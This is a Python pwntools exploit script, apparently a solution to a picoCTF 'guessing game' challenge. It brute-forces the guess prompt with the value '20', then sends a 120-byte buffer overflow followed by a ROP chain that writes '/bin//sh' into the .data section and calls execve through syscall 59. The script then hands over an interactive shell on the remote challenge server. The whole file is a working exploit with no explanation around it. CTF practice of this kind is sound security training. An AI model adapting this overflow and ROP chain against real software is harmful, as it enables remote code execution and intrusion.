from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("jupiter.challenges.picoctf.org", 50581)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x00400c8b
    #     continue
    #     ''')

    for _ in range(100):
        print(r.recvuntil(b'like to guess?'))

        payload = b"20"

        r.sendline(payload)
        print("stdin  : ", payload)

        res = r.recvline()
        print("stdout : ", res)

        res = r.recvline()
        print("stdout : ", res)

        if b'Nope' in res:
            print("No Hit!!!")
        else:
            print("Hit!!!!!!")
            break

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    payload2 = b"A" * 120

    payload2 += p64(0x004163f4) # pop rax ; ret
    payload2 += b"/bin//sh"
    payload2 += p64(0x0044a6b5) # pop rdx ; ret
    payload2 += p64(0x006ba0e0) # .data data_start
    payload2 += p64(0x00419127) # mov qword ptr [rdx], rax ; ret

    payload2 += p64(0x00400696) # pop rdi ; ret
    payload2 += p64(0x006ba0e0) # .data data_start
    payload2 += p64(0x00410ca3) # pop rsi ; ret
    payload2 += p64(0)
    payload2 += p64(0x0044a6b5) # pop rdx ; ret
    payload2 += p64(0)
    payload2 += p64(0x004163f4) # pop rax ; ret
    payload2 += p64(59)
    payload2 += p64(0x0040137c) # syscall

    r.sendline(payload2)
    print("stdin  : ", payload2)

    r.interactive()

if __name__ == "__main__":
    main()
